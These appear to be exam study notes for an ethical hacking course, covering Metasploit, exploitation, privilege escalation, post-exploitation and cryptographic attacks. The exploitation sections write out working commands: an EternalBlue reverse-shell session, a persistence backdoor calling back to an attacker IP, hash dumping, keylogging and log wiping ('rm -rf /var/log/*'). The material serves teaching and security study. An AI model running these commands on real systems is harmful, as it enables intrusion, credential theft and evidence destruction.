# Unit 3: Exploitation and Cryptographic Attacks — Detailed Notes (SPPU Exam-Oriented)

---

## 3.1 Introduction to Metasploit Framework — Basics, Architecture, and Usage

### What is Metasploit?
**Metasploit Framework (MSF)** is the most widely used **open-source penetration testing framework** developed by **Rapid7**. It provides a comprehensive platform for developing, testing, and executing exploits against target systems.

### Why Metasploit?
- **Modular architecture** — exploits, payloads, encoders, and post-exploitation modules are pluggable.
- **Large exploit database** — thousands of exploits for known CVEs.
- **Automated tasks** — simplifies exploitation, payload generation, and privilege escalation.
- **Cross-platform** — runs on Linux, Windows, and macOS.

### Metasploit Editions

| Edition | Cost | Features |
|---------|------|----------|
| **Metasploit Framework** | Free (Open Source) | Console-based, core exploits, community modules |
| **Metasploit Pro** | Commercial | Web UI, automation, phishing campaigns, reporting |
| **Metasploit Community** | Free (limited) | Web UI, basic features |
| **Metasploit Express** | Commercial | Simplified interface for small teams |

### Metasploit Architecture

```
                ┌─────────────────────────────┐
                │      Metasploit Framework   │
                │   (msfconsole / msfdb)      │
                └─────────────┬───────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
        ▼                     ▼                     ▼
┌───────────────┐   ┌───────────────────┐   ┌───────────────┐
│   Exploits    │   │     Payloads      │   │   Auxiliary   │
│  (exploit/)   │   │   (payload/)      │   │ (auxiliary/)  │
└───────┬───────┘   └────────┬──────────┘   └───────┬───────┘
        │                    │                      │
        ▼                    ▼                      ▼
┌───────────────┐   ┌───────────────────┐   ┌───────────────┐
│ - windows/smb │   │ - windows/meter- │   │ - scanner/    │
│ - linux/ftp   │   │   preter/reverse_│   │ - dos/        │
│ - webapp/     │   │   tcp            │   │ - fuzz/       │
│   joomla      │   │ - linux/shell/   │   │ - gather/     │
│               │   │   reverse_tcp    │   │               │
└───────────────┘   └───────────────────┘   └───────────────┘
        │                    │                      │
        └────────────────────┼──────────────────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │    Target System    │
                  └─────────────────────┘
```

### Key Components of Metasploit

| Component | Description | Example |
|-----------|-------------|---------|
| **Exploit** | Code that takes advantage of a vulnerability to deliver a payload | `windows/smb/ms17_010_eternalblue` |
| **Payload** | Code that runs on the target after successful exploitation | `windows/meterpreter/reverse_tcp` |
| **Auxiliary** | Non-exploit modules (scanners, fuzzers, DoS, sniffers) | `scanner/portscan/tcp` |
| **Encoder** | Obfuscates payloads to evade antivirus/firewall detection | `x86/shikata_ga_nai` |
| **NOP Generator** | Generates NOP (No Operation) sleds for buffer overflow | `x86/opty2` |
| **Post-Exploitation** | Modules for actions after gaining access | `post/windows/gather/hashdump` |
| **Listener** | Waits for incoming connection from payload (handler) | `exploit/multi/handler` |

### Common Payload Types

| Payload Type | Description | Example |
|-------------|-------------|---------|
| **Meterpreter** | Advanced payload with interactive shell, file system access, keylogging, etc. | `windows/meterpreter/reverse_tcp` |
| **Shell** | Basic command shell (cmd.exe or /bin/sh) | `windows/shell/reverse_tcp` |
| **Bind Shell** | Payload opens a port on target; attacker connects to it | `windows/shell/bind_tcp` |
| **Reverse Shell** | Payload connects back to attacker's machine | `windows/shell/reverse_tcp` |
| **Staged** | Small stub downloads larger payload (size-efficient) | `windows/meterpreter/reverse_tcp` |
| **Stageless** | Single monolithic payload (no network download needed) | `windows/meterpreter_reverse_tcp` |

### Bind vs Reverse Shell

```
Bind Shell:
  Attacker ───connect to──→ Target (port open)
  Target: opens port 4444 and waits

Reverse Shell:
  Attacker ←──connects back── Target
  Attacker: sets up listener on port 4444
  Target: initiates connection to attacker
```

**Why Reverse Shell is preferred**: Most target firewalls block incoming connections but allow outgoing. A reverse shell bypasses this restriction.

### Starting Metasploit

```bash
# Initialize database (PostgreSQL)
msfdb init

# Start Metasploit console
msfconsole

# Start with database
msfconsole -q

# Check database status
msf > db_status
```

### Basic msfconsole Commands

| Command | Description |
|---------|-------------|
| `help` | Show available commands |
| `search <keyword>` | Search for modules (exploits, payloads, auxiliary) |
| `use <module_path>` | Select a module |
| `back` | Go back from current module |
| `info` | Display module details |
| `show options` | Display configurable parameters |
| `show payloads` | List compatible payloads for current exploit |
| `show targets` | List supported target platforms/versions |
| `set <param> <value>` | Set a parameter (e.g., `set RHOSTS 192.168.1.10`) |
| `setg <param> <value>` | Set parameter globally for all modules |
| `unset <param>` | Unset a parameter |
| `run` / `exploit` | Execute the module |
| `check` | Check if target is vulnerable (not all exploits support this) |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with a session |
| `banner` | Display Metasploit banner |
| `exit` | Exit Metasploit |

### SPPU Exam Tip
> For "Explain Metasploit Framework architecture", draw a **block diagram** showing Exploits, Payloads, Auxiliary, Encoders, and Post-Exploitation modules. Explain **each component** with one example. Also **differentiate bind shell vs reverse shell** with a diagram.

---

## 3.2 Finding and Using Exploits — Searching, Selecting, and Executing

### Searching for Exploits

```bash
# Search by keyword
msf > search eternalblue
msf > search apache
msf > search ssh

# Search by CVE ID
msf > search CVE-2021-41773

# Search with filters
msf > search type:exploit platform:windows
msf > search type:auxiliary name:scanner
msf > search rank:excellent
msf > search cve:2021 type:exploit

# Search by date
msf > search disclosure_date:2020
```

### Exploit Ranks (Quality Rating)

| Rank | Description |
|------|-------------|
| **Excellent** | Exploit will never crash the service (e.g., PHP injection) |
| **Great** | Exploit has a default target and auto-detection |
| **Good** | Exploit has a default target but no auto-detection |
| **Normal** | Exploit is reliable but depends on specific conditions |
| **Average** | Exploit is generally unreliable |
| **Low** | Exploit is nearly impossible to execute reliably |
| **Manual** | Requires manual configuration or is very unreliable |

### Selecting and Using an Exploit

```
Step-by-Step Process:

1. Search for exploit
2. Select exploit: use exploit/windows/smb/ms17_010_eternalblue
3. View info: info
4. Show options: show options
5. Set required parameters:
     set RHOSTS 192.168.1.10
     set RPORT 445
6. Select payload: set PAYLOAD windows/x64/meterpreter/reverse_tcp
7. Set payload options:
     set LHOST 192.168.1.100
     set LPORT 4444
8. Check target (optional): check
9. Execute: run or exploit
```

### Practical Example — Exploiting EternalBlue (MS17-010)

```bash
msf > search eternalblue
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.1.10
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.100
msf > set LPORT 4444
msf > exploit

[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.10:445 - Connecting to target...
[*] 192.168.1.10:445 - Target OS: Windows Server 2008 R2
[*] 192.168.1.10:445 - Sending exploit...
[*] Sending stage (200262 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:49201)

meterpreter >
```

### Practical Example — Exploiting Apache Tomcat Manager

```bash
msf > use exploit/multi/http/tomcat_mgr_upload
msf > set RHOSTS 192.168.1.10
msf > set RPORT 8080
msf > set USERNAME tomcat
msf > set PASSWORD tomcat
msf > set PAYLOAD java/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.100
msf > exploit
```

### Using Auxiliary Modules

```bash
# Port scanner
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 192.168.1.0/24
msf > set PORTS 22,80,443,445,3389
msf > run

# SMB version scanner
msf > use auxiliary/scanner/smb/smb_version
msf > set RHOSTS 192.168.1.0/24
msf > run

# HTTP directory scanner
msf > use auxiliary/scanner/http/dir_scanner
msf > set RHOSTS 192.168.1.10
msf > set PATH /admin
msf > run
```

### SPPU Exam Tip
> For "Explain how to find and use exploits in Metasploit", describe the **search → use → set options → set payload → exploit** workflow. Give a **concrete example** (e.g., EternalBlue or Tomcat) with actual commands and expected output.

---

## 3.3 Gaining Access to Vulnerable Machines — Exploitation Techniques and Privilege Escalation

### Exploitation Techniques

#### 1. Remote Exploitation
Attacker exploits a vulnerability **over the network** without any prior access.

**Examples**:
- EternalBlue (MS17-010) — SMB remote code execution
- Apache Struts2 (CVE-2017-5638) — RCE via content-type header
- BlueKeep (CVE-2019-0708) — RDP remote code execution

#### 2. Client-Side Exploitation
Attacker tricks the **user** into executing malicious code (phishing, malicious attachments).

**Examples**:
- Browser exploit (drive-by download)
- PDF exploit (malicious PDF with embedded JavaScript)
- Office macro exploit (Word/Excel with VBA macro)

#### 3. Web Application Exploitation
Attacker exploits vulnerabilities in web apps.

**Examples**:
- SQL Injection
- File Upload (shell upload)
- Command Injection
- Server-Side Template Injection (SSTI)

#### 4. Social Engineering
- **Phishing**: Fake emails leading to credential harvesting or malware download.
- **Spear Phishing**: Targeted phishing against specific individuals.
- **Vishing**: Voice phishing (phone calls).
- **Baiting**: Malicious USB drives left in parking lots.

### Gaining Access with Metasploit

```bash
# After exploitation, you get a Meterpreter session
msf > exploit

[*] Meterpreter session 1 opened
meterpreter >
```

### Meterpreter Commands

| Category | Command | Description |
|----------|---------|-------------|
| **System** | `sysinfo` | Display system information |
| | `getuid` | Current user ID |
| | `getsystem` | Attempt privilege escalation (SYSTEM/root) |
| | `shell` | Drop to OS command shell |
| **File System** | `pwd`, `ls`, `cd` | Navigate directories |
| | `download <remote> <local>` | Download file from target |
| | `upload <local> <remote>` | Upload file to target |
| | `cat <file>` | Display file contents |
| **Network** | `ipconfig` / `ifconfig` | Network configuration |
| | `route` | Routing table |
| | `portfwd` | Port forwarding |
| | `arp` | ARP cache |
| **Persistence** | `run persistence` | Install persistent backdoor |
| | `run scheduleme` | Run command at scheduled time |
| **Privilege Escalation** | `getsystem` | Attempt SYSTEM/root |
| | `getprivs` | Current privileges |
| **Credential Access** | `hashdump` | Dump password hashes |
| | `run post/windows/gather/smart_hashdump` | Advanced hash dumping |
| **Keylogging** | `keyscan_start` | Start keylogging |
| | `keyscan_dump` | Dump captured keystrokes |
| | `keyscan_stop` | Stop keylogging |
| **Screenshot** | `screenshot` | Capture target's screen |
| **Webcam** | `webcam_snap` | Capture webcam image |
| | `webcam_stream` | Stream from webcam |
| **Misc** | `migrate <PID>` | Move payload to another process |
| | `background` | Background current session |
| | `exit` | Terminate session |

### Privilege Escalation

**Definition**: Privilege escalation is the process of elevating from a **lower-privileged account** (e.g., standard user) to a **higher-privileged account** (e.g., Administrator or SYSTEM).

#### Types of Privilege Escalation

| Type | Description | Example |
|------|-------------|---------|
| **Vertical Escalation** | Going from lower privilege to higher privilege | User → Administrator, User → SYSTEM |
| **Horizontal Escalation** | Moving to another account at the same privilege level | User A → User B (same level) |

#### Windows Privilege Escalation Techniques

| Technique | Description | Tools |
|-----------|-------------|-------|
| **Token Impersonation** | Steal access tokens of privileged processes | Meterpreter `incognito` module |
| **Service Exploitation** | Exploit vulnerable services running as SYSTEM | `windows-exploit-suggester` |
| **DLL Hijacking** | Replace a DLL loaded by a high-privilege process | Process Monitor |
| **Unquoted Service Path** | Exploit spaces in service binary paths | `winPEAS` |
| **Kernel Exploits** | Exploit OS kernel vulnerabilities | MS10-015, MS16-032, MS18-8120 |
| **AlwaysInstallElevated** | MSI packages install with SYSTEM privileges | Registry check |
| **Pass-the-Hash** | Use NTLM hash instead of password to authenticate | Mimikatz, `pth` module |

#### Linux Privilege Escalation Techniques

| Technique | Description | Tools |
|-----------|-------------|-------|
| **SUID Binary** | Exploit binaries with SUID bit set | `find / -perm -4000 2>/dev/null` |
| **Sudo Misconfiguration** | Abuse sudo permissions | `sudo -l` |
| **Kernel Exploits** | Dirty Pipe (CVE-2022-0847), Dirty Cow (CVE-2016-5195) | `linux-exploit-suggester` |
| **Cron Jobs** | Exploit misconfigured scheduled tasks | `cat /etc/crontab` |
| **Weak File Permissions** | Readable /etc/shadow, writable /etc/passwd | |
| **PATH Exploitation** | Hijack commands by manipulating PATH | |

#### Automatic Privilege Escalation in Metasploit

```bash
meterpreter > getsystem
... Attempting to get SYSTEM via Token Duplication
... Got SYSTEM via Token Duplication

# Or use local exploit suggester
meterpreter > run post/multi/recon/local_exploit_suggester
```

### SPPU Exam Tip
> For "Explain exploitation techniques and privilege escalation", define **vertical vs horizontal escalation**, list **5 techniques for Windows** and **5 for Linux**, and explain how `getsystem` works in Meterpreter.

---

## 3.4 Post-Exploitation & Maintaining Access — Covering Tracks, Persistence, and Pivoting

### Post-Exploitation Activities

Post-exploitation refers to actions taken **after gaining initial access** to a compromised system.

#### 1. Information Gathering
- Enumerate users, groups, and system details.
- Dump password hashes.
- Identify other connected systems (network enumeration).
- Collect sensitive files (financial data, credentials, intellectual property).

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > ipconfig
meterpreter > route
meterpreter > arp
```

#### 2. Persistence (Maintaining Access)

**Definition**: Ensuring continued access to the target even after reboot or credential changes.

**Windows Persistence Techniques**:

| Technique | Description | Metasploit Module |
|-----------|-------------|-------------------|
| **Registry Run Keys** | Add entry to Run/RunOnce registry keys | `post/windows/manage/persistence_exe` |
| **Scheduled Tasks** | Create task that runs at login or interval | |
| **Service Installation** | Install malicious service | |
| **Startup Folder** | Place executable in Startup folder | |
| **WMI Persistence** | Use WMI event subscription | `exploit/windows/local/wmi_persistence` |
| **DLL Hijacking** | Replace legitimate DLL with malicious one | |
| **Meterpreter Persistence** | Built-in Meterpreter persistence | `run persistence -X -i 10 -p 4444 -r 192.168.1.100` |

```bash
# Meterpreter persistence example
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.100
# -X: Auto-start on system boot
# -i 10: Reconnect every 10 seconds
# -p 4444: Port for callback
# -r 192.168.1.100: Attacker IP (LHOST)

# Alternative: Scheduled task persistence
meterpreter > run scheduleme -m 5 -c "C:\payload.exe"
# Runs payload every 5 minutes
```

**Linux Persistence Techniques**:

| Technique | Description |
|-----------|-------------|
| **Cron Jobs** | Add entry to crontab |
| **SSH Keys** | Add attacker's public key to authorized_keys |
| **bashrc / profile** | Add payload to .bashrc or /etc/profile |
| **Systemd Service** | Create custom systemd service |
| **/etc/rc.local** | Add startup command |

#### 3. Covering Tracks

**Definition**: Removing evidence of the intrusion to avoid detection.

| Technique | Windows | Linux |
|-----------|---------|-------|
| **Log Deletion** | `wevtutil cl <log>` | `rm -rf /var/log/*` |
| **Command History** | `doskey /listsize=0` | `history -c`, delete .bash_history |
| **Timestomp** | Modify file timestamps (`timestomp` in Meterpreter) | `touch -t` |
| **File Deletion** | `del /f payload.exe` | `shred -u payload` |
| **Alternate Data Streams** | Hide files in NTFS ADS | N/A |
| **Process Hiding** | Rootkits, `migrate` to trusted process | Rootkits (Diamorphine) |

```bash
# Clear event logs (Windows)
meterpreter > run clearev

# Timestomp a file
meterpreter > timestomp payload.exe -c "01/01/2020 12:00:00"
# -c: creation time, -a: access time, -m: modified time

# Clear command history (Linux)
meterpreter > shell
python -c "import readline; readline.clear_history()"
history -c
```

#### 4. Pivoting

**Definition**: Using a compromised machine as a **stepping stone** to access other systems in the **internal network** that are not directly reachable from the attacker.

```
Attacker (WAN) ──→ Compromised Host (DMZ) ──→ Internal Network
```

**Pivoting Techniques in Metasploit**:

```bash
# Add route to internal network through compromised host
meterpreter > run autoroute -s 10.10.10.0/24

# View active routes
meterpreter > run autoroute -p

# Use socks proxy for pivoting
meterpreter > background
msf > use auxiliary/server/socks_proxy
msf > set SRVHOST 127.0.0.1
msf > set SRVPORT 9050
msf > run

# Then use proxychains on attacker machine to route through it
# proxychains nmap -sT -sV 10.10.10.0/24
```

**Port Forwarding**:

```bash
# Forward a remote port to local machine
meterpreter > portfwd add -L 127.0.0.1 -l 3389 -p 3389 -r 10.10.10.50

# Now connect to local port to access RDP on internal host
# rdesktop 127.0.0.1:3389
```

### SPPU Exam Tip
> For "Explain post-exploitation and maintaining access", cover **4 key areas**: information gathering, persistence (with actual commands), covering tracks, and pivoting. Use a **diagram for pivoting** showing Attacker → Pivot Host → Internal Network.

---

## 3.5 Introduction to Cryptography — Purpose, Key Concepts, and Security Applications

### Definition
**Cryptography** is the practice and study of techniques for **secure communication** in the presence of adversaries. It involves converting plaintext into ciphertext (encryption) and back (decryption).

### Goals of Cryptography (CIA + AAA)

| Goal | Description | Example |
|------|-------------|---------|
| **Confidentiality** | Data is accessible only to authorized parties | Encryption (AES, RSA) |
| **Integrity** | Data has not been tampered with during transmission | Hashing (SHA-256), HMAC |
| **Authentication** | Verifying the identity of the communicating parties | Digital Signatures, Certificates |
| **Non-Repudiation** | Sender cannot deny having sent the message | Digital Signatures |
| **Availability** | Data and systems are accessible when needed | DDoS protection, redundancy |

### Key Terminology

| Term | Definition |
|------|------------|
| **Plaintext** | Original, readable data |
| **Ciphertext** | Encrypted, unreadable data |
| **Encryption** | Process of converting plaintext → ciphertext |
| **Decryption** | Process of converting ciphertext → plaintext |
| **Key** | Secret parameter used in encryption/decryption |
| **Cipher** | Algorithm for encryption/decryption |
| **Cryptanalysis** | Study of breaking cryptographic systems |
| **Cryptology** | Combined study of cryptography and cryptanalysis |
| **Key Space** | Total number of possible keys (larger = more secure) |
| **Entropy** | Measure of randomness/uncertainty in data |

### Types of Cryptography

```
                    Cryptography
                         │
         ┌───────────────┼───────────────┐
         │               │               │
         ▼               ▼               ▼
   Symmetric        Asymmetric        Hashing
   (Same Key)      (Public/Private)  (One-Way)
         │               │               │
         ▼               ▼               ▼
     AES, DES       RSA, ECC,       SHA-256,
     Blowfish,      Diffie-         MD5,
     3DES           Hellman         bcrypt
```

### Security Applications of Cryptography

| Application | How Cryptography is Used | Example |
|-------------|-------------------------|---------|
| **Secure Web (HTTPS)** | TLS/SSL uses asymmetric (handshake) + symmetric (data) | Padlock icon in browser |
| **Email Security** | PGP, S/MIME for encryption and digital signatures | ProtonMail |
| **VPN** | Encrypts all traffic between client and server | OpenVPN, WireGuard |
| **File Encryption** | Encrypt files at rest | BitLocker, VeraCrypt |
| **Blockchain** | Hashing for transaction integrity, digital signatures for ownership | Bitcoin, Ethereum |
| **Password Storage** | Hashing (not encryption) for storing passwords | bcrypt, argon2 |
| **Digital Signatures** | Proves authenticity and integrity of documents | DocuSign, eSign |
| **Wi-Fi Security** | WPA2/WPA3 for wireless encryption | Home Wi-Fi |

### Kerckhoff's Principle
> "A cryptosystem should be secure even if everything about the system, except the key, is public knowledge."

**Implication**: Security should rely on **key secrecy**, not algorithm secrecy. Open algorithms (AES, RSA) that have been publicly vetted are more trustworthy than secret/obscure ones.

### SPPU Exam Tip
> For "Explain the purpose and key concepts of cryptography", define **cryptography**, list the **5 goals** (CIA + Authentication + Non-Repudiation), explain **key terms** (plaintext, ciphertext, key, cipher), and give **3 real-world applications**.

---

## 3.6 Types of Encryption — Symmetric, Asymmetric, Hashing, and Steganography in Hacking

### 1. Symmetric Encryption

**Definition**: Same key is used for both encryption and decryption. Also called **secret-key** or **private-key** cryptography.

```
      Plaintext ──→ [Encrypt] ──→ Ciphertext ──→ [Decrypt] ──→ Plaintext
                        │                            │
                        └───────── Shared Key ────────┘
```

**Characteristics**:
- **Fast** — suitable for bulk data encryption.
- **Key distribution problem** — both parties must securely share the key.
- **Key management** — with N parties, need N(N-1)/2 keys.

**Common Algorithms**:

| Algorithm | Key Size | Block Size | Status |
|-----------|----------|------------|--------|
| **AES** | 128, 192, 256 bits | 128 bits | Secure (standard) |
| **DES** | 56 bits | 64 bits | Broken (brute-forced) |
| **3DES** | 112, 168 bits | 64 bits | Deprecated (slow) |
| **Blowfish** | 32–448 bits | 64 bits | Secure but slow |
| **Twofish** | 128–256 bits | 128 bits | Secure |
| **RC4** | 40–2048 bits | Stream | Broken (weak) |

**Modes of Operation** (for block ciphers):

| Mode | Description | Use Case |
|------|-------------|----------|
| **ECB** | Each block encrypted independently (insecure — same plaintext = same ciphertext) | Avoid |
| **CBC** | Each block XORed with previous ciphertext before encryption | General purpose |
| **CFB** | Converts block cipher to stream cipher | Real-time data |
| **OFB** | Generates key stream from block cipher | Noisy channels |
| **CTR** | Counter mode — parallelizable, fast | High performance |

### 2. Asymmetric Encryption

**Definition**: Two different but mathematically related keys — **public key** (shared openly) and **private key** (kept secret). Also called **public-key cryptography**.

```
      Plaintext ──→ [Encrypt with Public Key] ──→ Ciphertext ──→ [Decrypt with Private Key] ──→ Plaintext
```

**Characteristics**:
- **Slower** than symmetric — typically used for key exchange or signing small data.
- **Solves key distribution problem** — public key can be shared freely.
- **Provides non-repudiation** — only the private key holder could have signed.

**Common Algorithms**:

| Algorithm | Key Size (bit) | Equivalent Symmetric Strength | Use |
|-----------|---------------|-------------------------------|-----|
| **RSA** | 2048, 4096 | 112–128 bits | Encryption, Signing |
| **ECC** | 256, 384, 521 | 128–256 bits | Encryption, Signing (smaller keys) |
| **Diffie-Hellman** | 2048, 4096 | 112–128 bits | Key Exchange |
| **DSA** | 2048, 3072 | 112–128 bits | Digital Signatures |
| **ElGamal** | 2048+ | — | Encryption |

**Key Size Comparison**:
```
RSA 1024 ≈ ECC 160 (80-bit symmetric)
RSA 2048 ≈ ECC 224 (112-bit symmetric)
RSA 3072 ≈ ECC 256 (128-bit symmetric)  ← Current standard
RSA 7680 ≈ ECC 384 (192-bit symmetric)
RSA 15360 ≈ ECC 521 (256-bit symmetric)
```

### 3. Hashing (One-Way Function)

**Definition**: A **one-way** mathematical function that converts arbitrary-length input into a **fixed-length output** (hash/digest). Cannot be reversed.

```
Input (any size) ──→ [Hash Function] ──→ Fixed-length Hash (e.g., 256 bits)
```

**Properties of a Good Hash Function**:
1. **Deterministic** — same input always produces same output.
2. **Preimage Resistance** — given hash H, infeasible to find input X such that H(X) = H.
3. **Second Preimage Resistance** — given input X, infeasible to find input Y ≠ X with H(X) = H(Y).
4. **Collision Resistance** — infeasible to find any X ≠ Y with H(X) = H(Y).
5. **Avalanche Effect** — small change in input produces completely different hash.

**Common Hash Algorithms**:

| Algorithm | Output Size | Status |
|-----------|-------------|--------|
| **MD5** | 128 bits | Broken (collisions found) |
| **SHA-1** | 160 bits | Broken (SHAttered attack, 2017) |
| **SHA-256** | 256 bits | Secure (part of SHA-2 family) |
| **SHA-512** | 512 bits | Secure (part of SHA-2 family) |
| **SHA-3** | 224, 256, 384, 512 bits | Secure (Keccak-based) |
| **bcrypt** | Variable | Secure (includes salt + work factor) |
| **scrypt** | Variable | Secure (memory-hard) |
| **argon2** | Variable | Most secure (winner of PHC) |

**Uses of Hashing**:
- Password storage (bcrypt, argon2)
- File integrity verification (SHA-256 checksums)
- Digital signatures (hash then sign)
- Blockchain (proof-of-work, transaction integrity)
- Data deduplication

### 4. Steganography

**Definition**: The practice of **hiding a message within another medium** (image, audio, video, text) so that the existence of the hidden message is concealed.

| Aspect | Cryptography | Steganography |
|--------|-------------|---------------|
| **Goal** | Hide the **content** of the message | Hide the **existence** of the message |
| **Detection** | Ciphertext is obviously suspicious | Looks innocent — harder to detect |
| **Combination** | Often used together: encrypt then hide | |

**Steganography Techniques**:

| Medium | Technique | Example |
|--------|-----------|---------|
| **Image** | LSB (Least Significant Bit) substitution | Change last bit of each pixel's RGB value |
| **Audio** | LSB in audio samples, echo hiding | WAV/MP3 files |
| **Video** | LSB in video frames | AVI/MP4 files |
| **Text** | Whitespace manipulation, font changes | Invisible characters |
| **Network** | Hiding data in TCP/IP headers (Covert Channels) | Modified TTL values, unused header fields |

**Steganalysis**: The art of detecting steganography.
- Statistical analysis of pixel distributions.
- Detecting unusual patterns in LSB values.
- File size anomalies.

**Steganography Tools**:
- **steghide** — Hide data in JPEG/BMP/WAV files.
- **OpenPuff** — Multi-format steganography.
- **Snow** — Whitespace steganography (text).
- **Covert_TCP** — Network covert channel tool.

**Steganography in Hacking**:
- Exfiltrating stolen data through images on public websites.
- Hiding command-and-control (C2) communications in innocent-looking traffic.
- Embedding payloads in image files (polyglot files).

```bash
# Hide data in image
steghide embed -cf image.jpg -ef secret.txt -p password123

# Extract hidden data
steghide extract -sf image.jpg -p password123
```

### Comparison Summary

| Property | Symmetric | Asymmetric | Hashing | Steganography |
|----------|-----------|------------|---------|---------------|
| **Keys** | Single shared key | Public + Private pair | No key | Optional password |
| **Speed** | Fast | Slow | Very fast | Depends on medium |
| **Reversible** | Yes | Yes | No | Yes |
| **Confidentiality** | Yes | Yes | No | Yes (hides existence) |
| **Integrity** | No | No | Yes | No |
| **Non-Repudiation** | No | Yes (signing) | No | No |
| **Use Case** | Data at rest, bulk encryption | Key exchange, digital signatures | Password storage, integrity | Covert communication |

### SPPU Exam Tip
> For "Explain types of encryption with comparison", write **all 4 types** (Symmetric, Asymmetric, Hashing, Steganography). For each: definition, diagram, algorithm examples, advantages, disadvantages, and use case. End with a **comparison table**.

---

## 3.7 Encryption Algorithms & Exploitation — AES, RSA, SHA Vulnerabilities and Attacks

### AES (Advanced Encryption Standard)

**Overview**:
- Symmetric block cipher, key sizes: 128, 192, 256 bits.
- Block size: 128 bits.
- Adopted by US NIST in 2001 (replaced DES).
- Rijndael cipher (by Daemen and Rijmen).

**AES Operations** (10/12/14 rounds for 128/192/256):

| Step | Description |
|------|-------------|
| **SubBytes** | Non-linear substitution (S-box) |
| **ShiftRows** | Row-wise permutation |
| **MixColumns** | Column-wise mixing (matrix multiplication) |
| **AddRoundKey** | XOR with round key derived from master key |

**AES Attacks**:

| Attack | Requirement | Impact |
|--------|-------------|--------|
| **Brute Force** | Not feasible with 128+ bit keys | 2^128 keys — impossible with current technology |
| **Side-Channel** | Physical access, timing/power analysis | Leaks key via measurement |
| **Related-Key Attack** | Attacker can modify key | AES-256 reduced to 2^99.5 (theoretical) |
| **Cache-Timing Attack** | Shared environment (cloud) | Key extraction via cache timing |
| **Known Attacks** | Only effective against reduced-round variants | Full AES is secure |

**AES Security**: AES-128/192/256 are considered **secure** for all practical purposes. The best known attack on full AES-128 is 2^126 (insignificant).

### RSA (Rivest-Shamir-Adleman)

**Overview**:
- Asymmetric algorithm, security based on **integer factorization problem**.
- Key sizes: 1024 (deprecated), 2048 (minimum), 4096 (recommended).

**RSA Key Generation**:
```
1. Choose two large primes p and q
2. Compute n = p × q (modulus)
3. Compute φ(n) = (p-1)(q-1)
4. Choose e such that 1 < e < φ(n) and gcd(e, φ(n)) = 1
5. Compute d = e^(-1) mod φ(n) (modular inverse)

Public Key: (e, n)
Private Key: (d, n)
```

**RSA Encryption/Decryption**:
```
Encryption:   c = m^e mod n
Decryption:   m = c^d mod n
```

**RSA Attacks**:

| Attack | Description | Mitigation |
|--------|-------------|------------|
| **Factorization Attack** | Factor n into p and q using advanced algorithms (NFS) | Use ≥ 2048-bit keys |
| **Chosen Ciphertext Attack** | Attacker decrypts chosen ciphertexts | Use OAEP padding |
| **Padding Oracle Attack** | Server reveals whether padding is valid | Use constant-time comparison |
| **Coppersmith Attack** | Exploits small exponent e with known plaintext | Use proper padding |
| **Wiener Attack** | Exploits small private exponent d | Ensure d > n^0.25 |
| **Hastad's Broadcast Attack** | Same message encrypted with small e to multiple recipients | Randomize padding per recipient |
| **Timing Attack** | Measure decryption time | Constant-time implementation |
| **Side-Channel (TEMPEST)** | EM radiation analysis | Shielding |

**RSA Security Status**:
- **RSA-1024**: Likely breakable by well-funded attackers (deprecated).
- **RSA-2048**: Currently secure (recommended minimum).
- **RSA-4096**: Secure, but computationally expensive.
- **Quantum Threat**: Shor's algorithm (theoretical quantum computer) would break RSA — **post-quantum cryptography** being developed.

### SHA (Secure Hash Algorithm) Vulnerabilities

#### SHA-0 and SHA-1

| Algorithm | Output | Status | Vulnerability |
|-----------|--------|--------|---------------|
| **SHA-0** | 160 bits | Broken | Collisions found in 1998 (withdrawn) |
| **SHA-1** | 160 bits | Broken | **SHAttered attack** (2017): Google demonstrated collision attack costing ~110 GPU-years |
| **SHA-2** | 224, 256, 384, 512 bits | Secure | No practical attacks |
| **SHA-3** | 224, 256, 384, 512 bits | Secure | Newest standard |

**SHA-1 SHAttered Attack (2017)**:
- Google and CWI Amsterdam demonstrated a **collision attack** on SHA-1.
- Cost: ~110 GPU-years of computation.
- Produced two different PDF files with the same SHA-1 hash.
- **Impact**: SHA-1 is officially deprecated — all major browsers and CAs stopped accepting SHA-1 certificates.

#### MD5 (Message Digest 5)

- **128-bit** hash, widely used historically.
- **Broken**: Collision attacks are trivial (can generate collisions in seconds on modern hardware).
- **Flame Malware (2012)**: Used an MD5 collision to forge a Microsoft code-signing certificate.

| Algorithm | Output | Collision Resistance | Recommendation |
|-----------|--------|---------------------|----------------|
| **MD5** | 128 bits | Broken | Do not use |
| **SHA-1** | 160 bits | Broken (SHAttered) | Deprecated |
| **SHA-256** | 256 bits | Secure | Recommended |
| **SHA-512** | 512 bits | Secure | Recommended (high security) |
| **SHA-3** | Variable | Secure | Future-proof |

### Password Hashing Attacks

| Attack | Description | Tool |
|--------|-------------|------|
| **Brute Force** | Try all possible combinations | Hashcat, John the Ripper |
| **Dictionary Attack** | Try common words/passwords | Hashcat, John |
| **Rainbow Table** | Precomputed hash → password mappings | Use **salting** to prevent |
| **Birthday Attack** | Find two inputs with same hash (collision) | For hash collision, not password cracking |

**Defense**: Use **slow, salted, memory-hard** hash functions (bcrypt, scrypt, argon2).

### SPPU Exam Tip
> For "Explain AES, RSA, SHA and their vulnerabilities", explain **each algorithm** (type, key size, mathematical basis), then list **3 attacks per algorithm**. For SHA, differentiate between **SHA-1 (broken)** and **SHA-2/SHA-3 (secure)**. Mention **quantum threat** for RSA.

---

## 3.8 Digital Signatures & PKI — Role in Security and Ethical Hacking Attacks

### Digital Signatures

**Definition**: A digital signature is a mathematical scheme for verifying the **authenticity** and **integrity** of a digital message.

**How Digital Signatures Work**:

```
Signing:
  Message → Hash (SHA-256) → Encrypt hash with Private Key → Signature

Verification:
  Message → Hash (SHA-256) → Compare with Decrypted Signature (using Public Key)
```

**Properties**:
| Property | Description |
|----------|-------------|
| **Authentication** | Verifies the signer's identity |
| **Integrity** | Detects any modification to the signed data |
| **Non-Repudiation** | Signer cannot deny signing |
| **Efficiency** | Hash + sign is faster than signing entire message |

**Common Digital Signature Algorithms**:

